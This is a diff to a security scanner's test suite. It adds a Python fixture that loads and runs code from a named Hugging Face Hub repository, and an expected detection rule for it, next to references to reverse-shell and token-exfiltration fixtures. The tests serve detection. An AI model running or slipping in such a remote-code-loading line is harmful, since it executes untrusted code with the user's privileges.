@@ -131,6 +131,12 @@ def rev_shell():
 """).strip()
 `)
 
+			// A call that imports and runs a Hub repository's code in this process.
+			f.addText("python_remote_tool/exploit.py", `import transformers
+
+transformers.load_tool('Retr0REG/huggingface-hub-tools-deserialization')
+`)
+
 			// Benign: a socket server that echoes what it receives and runs nothing.
 			f.addText("benign/echo_server.py", `import socket
 
@@ -213,6 +219,9 @@ def load(path):
 					Notes: "os.getenv token sent with requests.post to a webhook"},
 				"python_taint/modeling_x.py": {Expect: []string{"SC4N-CODE-TAINT-EXEC", "SC4N-CODE-ENCODED-PAYLOAD"},
 					Notes: "base64.b64decode source flows into exec"},
+				"python_remote_tool/exploit.py": {Expect: []string{"SC4N-CODE-REMOTE-TOOL-LOADER"},
+					Notes: "load_tool('org/repo') imports a Hub repository's Python module into this " +
+						"process: the repository's code runs with the caller's privileges"},
 				"python_reverse_shell/generator.py": {Expect: []string{"SC4N-CODE-REVERSE-SHELL"},
 					Notes: "socket + connect + recv + subprocess in one artifact, here inside a " +
 						"textwrap.dedent literal: the payload text is the signal"},
